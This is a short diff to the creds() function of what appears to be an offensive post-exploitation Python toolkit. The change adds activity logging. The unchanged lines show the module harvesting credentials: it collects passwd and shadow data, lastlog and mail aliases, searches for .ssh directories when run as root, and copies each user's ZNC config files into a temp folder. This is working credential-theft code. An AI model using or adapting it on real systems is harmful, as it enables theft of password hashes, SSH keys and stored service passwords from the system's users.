@@ -5,6 +5,9 @@ def creds():
     @author: ohdae [bindshell@live.com]
     @short: enumerate user and system credentials
     '''
+    if Logging == "yes":
+        write2file(ActivityLog, "\n\n [ Credentials Module ]")
+
     print("[+] Collecting user and system credentials....")
     maketemp("credentials")
     os.chdir(Temp_Dir+"/credentials/")
@@ -15,6 +18,8 @@ def creds():
     os.system("lastlog > lastlog.txt")
     os.system("last -a > last.txt")
     os.system("getent aliases > mail_aliases.txt")
+    if Logging == "yes":
+        write2file(ActivityLog, "\n ACTION: passwd, shadow, lastlog and mail aliases collected.")
 
     if currentuser == "root":
         os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
@@ -78,6 +83,5 @@ def creds():
     for user in userlist:
         copy2temp("/home/%s/.znc/configs/znc.conf" % user)
 
-           
-            
+
 
